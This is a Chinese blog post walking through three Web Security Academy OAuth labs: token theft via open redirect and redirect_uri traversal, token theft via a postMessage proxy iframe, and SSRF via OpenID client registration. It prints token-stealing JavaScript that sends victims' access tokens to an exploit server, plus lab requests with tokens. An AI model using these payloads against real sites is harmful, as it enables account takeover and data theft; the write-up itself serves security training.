+<h2 id="通过开放重定向窃取-OAuth-访问令牌"><a href="#通过开放重定向窃取-OAuth-访问令牌" class="headerlink" title="通过开放重定向窃取 OAuth 访问令牌"></a>通过开放重定向窃取 OAuth 访问令牌</h2><p>在没有state参数的基础上，在对<code>redirect_uri</code>参数的内容做出限制后，使得无法直接在oauth验证的过程中直接通过重定向获取code</p>
+<p>但是，如果授权方式是implicit（简化）的话，且当前网站存在其他开发重定向的地方，就可以直接获得access_token，然后通过access_token来获取数据</p>
+<p>所以通过这个漏洞获取access_token的条件如下</p>
+<ol>
+<li>网站存在开发重定向</li>
+<li>redirect_uri部分可控</li>
+<li>授权访问为implicit（简化）</li>
+<li>没有state参数</li>
+</ol>
+<p>首先通过社交媒体账户登录，然后观察他的数据包</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251547768.png" title="image-20230625154714660" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251547768.png" alt="image-20230625154714660"></a></p>
+<p>可以知道是使用了implicit授权方式，然后尝试调试redirect_uri参数，看看哪些部分是可控的</p>
+<p>发现，redirect_uri必须是以<code>https://0a57000d0425b19181d10c1e00e900fd.web-security-academy.net/oauth-callback</code>开头，少一点都会报错</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251549825.png" title="image-20230625154901734" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251549825.png" alt="image-20230625154901734"></a></p>
+<p>但是他尾部字符是可控的，例如使用<code>/../</code>的方式来目录遍历</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251549939.png" title="image-20230625154944851" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251549939.png" alt="image-20230625154944851"></a></p>
+<p>这样在重定向后，就会跳转到<code>https://0a57000d0425b19181d10c1e00e900fd.web-security-academy.net/</code>而不是<code>https://0a57000d0425b19181d10c1e00e900fd.web-security-academy.net/oauth-callback</code></p>
+<p>然后再寻找网站上是否存在开放重定向</p>
+<p>在文章页面最下面，有个next post</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251550761.png" title="image-20230625155044692" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251550761.png" alt="image-20230625155044692"></a></p>
+<p>抓包数据包，如下</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251551618.png" title="image-20230625155103537" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251551618.png" alt="image-20230625155103537"></a></p>
+<p>尝试修改path参数的值，可以发现，他能跳转到任何页面，存在开放重定向</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251551057.png" title="image-20230625155130968" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251551057.png" alt="image-20230625155130968"></a></p>
+<p>所以我们只需要将oauth重定向的页面设置为这里，然后再将这里重定向的目标设置为攻击者，就能获得<code>access_token</code></p>
+<p>将<code>redirect_uri</code>的值设置为<code>https://0a57000d0425b19181d10c1e00e900fd.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0aec00d004df62938029bbeb0173008e.exploit-server.net/exploit</code></p>
+<p><code>https://exploit-0aa3005d0437b11081120bb201eb00f9.exploit-server.net/exploit</code>中的代码为</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>(!<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;https://oauth-0a7b005604ac628b8098ba9702b40079.oauth-server.net/auth?client_id=y31ziyekh2r3sxts1xf4s&amp;redirect_uri=https://0ad000fb047562e18006bcb300ff0084.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0aec00d004df62938029bbeb0173008e.exploit-server.net/exploit&amp;response_type=token&amp;nonce=585964507&amp;scope=openid%20profile%20email&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> token=<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>);</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;/?token=&quot;</span>+token;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的意思就是，如果能收到token，就去获取token，如果没有收到，就重定向到oauth认证的地方</p>
+<p>将这个发送给受害者，受害者访问这个页面就，我们就可以在日志处收到token</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251653598.png" title="image-20230625165345464" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251653598.png" alt="image-20230625165345464"></a></p>
+<p>放进这个数据包里，token为我们获得的受害者token然后使用在浏览器发送数据包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST /authenticate HTTP/2</span><br><span class="line">Host: 0ad000fb047562e18006bcb300ff0084.web-security-academy.net</span><br><span class="line">Cookie: session=gh5w8QOMzKxBGuRPQ8cvcJWj69J3x9EX</span><br><span class="line">Content-Length: 103</span><br><span class="line">Sec-Ch-Ua: &quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Origin: https://0ad000fb047562e18006bcb300ff0084.web-security-academy.net</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://0ad000fb047562e18006bcb300ff0084.web-security-academy.net/oauth-callback</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">&#123;&quot;email&quot;:&quot;wiener@hotdog.com&quot;,&quot;username&quot;:&quot;wiener&quot;,&quot;token&quot;:&quot;gbIj-vylUIX0pmvbcbfVrTqmIBPlsHqT9uxawMejML-&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发送后，我们就可能登录受害者账户</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251658326.png" title="image-20230625165826254" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251658326.png" alt="image-20230625165826254"></a></p>
+<p>但是这里我们看不到apikey，所以需要直接从oauth服务器来获得</p>
+<p>查看数据包历史，可以发现有一个<code>/me</code>接口，是用来向oauth服务器请求用户数据的。<br>将token替换进去，就可以获得administrator的apikey</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251659994.png" title="image-20230625165921886" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306251659994.png" alt="image-20230625165921886"></a></p>
+<h2 id="通过代理页面窃取-OAuth-访问令牌"><a href="#通过代理页面窃取-OAuth-访问令牌" class="headerlink" title="通过代理页面窃取 OAuth 访问令牌"></a>通过代理页面窃取 OAuth 访问令牌</h2><p>这里的漏洞原理和上面那个差不多，但是实现的方法换了一个，经过测试，redirect_uri还是可以控制后半段利用目录穿越来跳转到网站的某个功能点</p>
+<p>所以通过这个漏洞获取access_token的条件如下</p>
+<ol>
+<li>网站存在可以进行代理的地方，如使用iframe和parent.postmessage，且接受处设置为<code>*</code></li>
+<li>redirect_uri部分可控</li>
+<li>授权访问为implicit（简化）</li>
+<li>没有state参数</li>
+</ol>
+<p>首先通过媒体账户登录，查看流量包</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306252113940.png" title="image-20230625211312811" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306252113940.png" alt="image-20230625211312811"></a></p>
+<p>可以发现是用的implicit授权方式，且没有state，又可以csrf</p>
+<p>当前网站存在代理的点在每个文章评论的地方</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306252114510.png" title="image-20230625211451431" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306252114510.png" alt="image-20230625211451431"></a></p>
+<p>他这个评论表单，是通过<code>&lt;iframe&gt;</code>加载的</p>
+<p>访问<code>https://0a2000d203d73f4580f108f200a6007a.web-security-academy.net/post/comment/comment-form#postId=7</code>，查看源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">/resources/css/labs.css</span> <span class="attr">rel</span>=<span class="string">stylesheet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            parent.<span class="title function_">postMessage</span>(&#123;<span class="attr">type</span>: <span class="string">&#x27;onload&#x27;</span>, <span class="attr">data</span>: <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>&#125;, <span class="string">&#x27;*&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">function</span> <span class="title function_">submitForm</span>(<span class="params">form, ev</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                ev.<span class="title function_">preventDefault</span>();</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>(<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;comment-form&quot;</span>));</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> hashParams = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">substr</span>(<span class="number">1</span>));</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">const</span> o = &#123;&#125;;</span></span><br><span class="line"><span class="language-javascript">                formData.<span class="title function_">forEach</span>(<span class="function">(<span class="params">v, k</span>) =&gt;</span> o[k] = v);</span></span><br><span class="line"><span class="language-javascript">                hashParams.<span class="title function_">forEach</span>(<span class="function">(<span class="params">v, k</span>) =&gt;</span> o[k] = v);</span></span><br><span class="line"><span class="language-javascript">                parent.<span class="title function_">postMessage</span>(&#123;<span class="attr">type</span>: <span class="string">&#x27;oncomment&#x27;</span>, <span class="attr">content</span>: o&#125;, <span class="string">&#x27;*&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                form.<span class="title function_">reset</span>();</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">add-comment</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Leave a comment<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">comment-form</span> <span class="attr">onsubmit</span>=<span class="string">&#x27;submitForm(this, event)&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span>&gt;</span>Comment:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">required</span> <span class="attr">rows</span>=<span class="string">12</span> <span class="attr">cols</span>=<span class="string">300</span> <span class="attr">name</span>=<span class="string">&#x27;comment&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span>&gt;</span>Website:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">input</span> <span class="attr">pattern</span>=<span class="string">&quot;(http:|https:).+&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;website&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">button</span> <span class="attr">type</span>=<span class="string">submit</span>&gt;</span>Post Comment<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先分析这里的js代码</p>
+<p>首先向父页面发送了当前页面的url，类型为onload</p>
+<p>然后再依次读取评论中的数据，放进对象o，以及将uri中<code>#</code>后面的字符串也放进对象o，然后再将对象o发送给父页面，并将数据类型设置为<code>oncomment</code></p>
+<p>这里的父页面，就是每个文章页，如<code>https://0a2000d203d73f4580f108f200a6007a.web-security-academy.net/post?postId=7</code></p>
+<p>再查看他的源码，其中有一段</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (e.<span class="property">data</span>.<span class="property">type</span> === <span class="string">&#x27;oncomment&#x27;</span>) &#123;</span><br><span class="line">        e.<span class="property">data</span>.<span class="property">content</span>[<span class="string">&#x27;csrf&#x27;</span>] = <span class="string">&#x27;FuOReeI44DgA3xX7ATGngJWITEio5kSQ&#x27;</span>;</span><br><span class="line">        <span class="keyword">const</span> body = <span class="built_in">decodeURIComponent</span>(<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(e.<span class="property">data</span>.<span class="property">content</span>).<span class="title function_">toString</span>());</span><br><span class="line">        <span class="title function_">fetch</span>(<span class="string">&quot;/post/comment&quot;</span>,</span><br><span class="line">              &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">body</span>: body</span><br><span class="line">        &#125;</span><br><span class="line">             ).<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>监听子页面的message传输，如果遇到oncomment类型的数据，就将数据发送给<code>/post/comment</code>路由</p>
+<p>然后强制刷新页面，显示评论的内容</p>
+<p>关键利用点在于</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parent.<span class="title function_">postMessage</span>(&#123;<span class="attr">type</span>: <span class="string">&#x27;onload&#x27;</span>, <span class="attr">data</span>: <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>&#125;, <span class="string">&#x27;*&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>他后面使用的<code>*</code>意味着接收方可以是任何窗口，即不限制源域和目标域的关系。</p>
+<p>所以，只要攻击者在他的服务器上使用iframe引用这段代码，就可以在攻击者服务器上获得他发送的信息</p>
+<p>所以我们只要把他当做中转点，就可以获得在implicit授权模式下的明文access_token了</p>
+<p>在攻击者服务器上添加以下代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;message&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;/&quot;</span> + <span class="built_in">encodeURIComponent</span>(e.<span class="property">data</span>.<span class="property">data</span>))</span><br><span class="line">&#125;, <span class="literal">false</span>)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&#x27;https://oauth-0aba001d03fe3fac80370646029000de.oauth-server.net/auth?client_id=hgutddt29koq9s8u710xm&amp;redirect_uri=https://0a2000d203d73f4580f108f200a6007a.web-security-academy.net/oauth-callback/../post/comment/comment-form&amp;response_type=token&amp;nonce=-1906343812&amp;scope=openid%20profile%20email&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>这里的redirect_uri替换为了<code>/post/comment/comment-form</code>，由于是在<code>&lt;iframe&gt;</code>中调用的，所以即使跳转后，当前页面仍然是父页面，所以我们就可以成功收到<code>/post/comment/comment-form</code>发送的数据</p>
+<p>然后将这个段代码发送给受害者，然后就可以在log里看到access_token</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306252147252.png" title="image-20230625214722161" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306252147252.png" alt="image-20230625214722161"></a></p>
+<p>使用这个token去<code>/me</code>路由查询administrator信息即可</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306252148430.png" title="image-20230625214804331" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202306252148430.png" alt="image-20230625214804331"></a></p>
+<h2 id="通过-OpenID-动态客户端注册的-SSRF"><a href="#通过-OpenID-动态客户端注册的-SSRF" class="headerlink" title="通过 OpenID 动态客户端注册的 SSRF"></a>通过 OpenID 动态客户端注册的 SSRF</h2><p>这个就是利用任意客户端注册，然后利用里面的参数导致的ssrf</p>
+<p>先开启bp，然后使用<code>wiener:peter</code>登录</p>
+<p>访问oauth服务器的<code>/.well-known/openid-configuration</code>来获取注册客户端的uri：<code>https://oauth-0a63005e032aee3a800d6abc026200df.oauth-server.net/reg</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202307011517140.png" title="image-20230701151746986" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202307011517140.png" alt="image-20230701151746986"></a></p>
+<p>然后查看数据包历史，可以发现，有个这样的数据包</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202307011521794.png" title="image-20230701152140708" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202307011521794.png" alt="image-20230701152140708"></a></p>
+<p>他会回显client_id为veu4bulutxrptzjdhq7tu配置的logo_uri指向的图片，这里可以进行ssrf</p>
+<p>首先使用以下参数进行注册，进行验证是否存在ssrf</p>
+<p>用collaborator client来获取一个uri</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /reg HTTP/2</span><br><span class="line">Host: oauth-0a63005e032aee3a800d6abc026200df.oauth-server.net</span><br><span class="line">Cookie: _session=TzNH1w0sbJRRdTeIbN_BQ; _session.legacy=TzNH1w0sbJRRdTeIbN_BQ</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0</span><br><span class="line">Accept: image/avif,image/webp,*/*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://oauth-0a63005e032aee3a800d6abc026200df.oauth-server.net/interaction/z1AiQLDE6bxqW9T68L3O6</span><br><span class="line">Sec-Fetch-Dest: image</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Te: trailers</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 210</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;application_type&quot;</span>: <span class="string">&quot;web&quot;</span>,</span><br><span class="line">    <span class="string">&quot;redirect_uris&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;http://fuzz.com&quot;</span></span><br><span class="line">     </span><br><span class="line">        ],</span><br><span class="line">    <span class="string">&quot;client_name&quot;</span>: <span class="string">&quot;My Application&quot;</span>,</span><br><span class="line"><span class="string">&quot;logo_uri&quot;</span> : <span class="string">&quot;http://8enpgim94eqpdxjr6jkurqu25tblza.oastify.com&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202307011523593.png" title="image-20230701152355504" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202307011523593.png" alt="image-20230701152355504"></a></p>
+<p>然后使用这个client_id去访问之前那个端点</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202307011524743.png" title="image-20230701152436662" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202307011524743.png" alt="image-20230701152436662"></a></p>
+<p>成功收到回显，在bp的collaborator client中也能收到访问记录</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202307011525378.png" title="image-20230701152508301" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202307011525378.png" alt="image-20230701152508301"></a></p>
+<p>是存在ssrf的</p>
+<p>再将<code>logo_uri</code>替换为目标uri进行注册</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202307011527014.png" title="image-20230701152711927" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202307011527014.png" alt="image-20230701152711927"></a></p>
+<p>替换client_id去访问之前获取logo的接口</p>
+<p>成功获得ak</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202307011527863.png" title="image-20230701152756772" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202307011527863.png" alt="image-20230701152756772"></a></p>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/Oauth2/'>
+                            Oauth2
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/web%E6%BC%8F%E6%B4%9E/'>
+                            web漏洞
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
